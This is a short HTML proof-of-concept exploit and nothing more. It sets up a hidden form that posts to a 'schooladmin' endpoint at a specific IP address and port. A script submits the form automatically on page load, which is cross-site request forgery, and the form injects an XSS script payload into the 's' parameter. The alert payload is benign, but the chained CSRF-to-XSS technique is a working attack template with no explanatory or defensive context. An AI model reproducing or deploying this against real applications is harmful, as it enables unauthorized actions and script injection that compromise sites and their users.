<form name="x" action="http://52.10.43.36:8200/schooladmin" method="post">
<input type="hidden" name='s' value='<script>alert(/XSS/)</script>'>
</form>
<script>document.x.submit();</script>
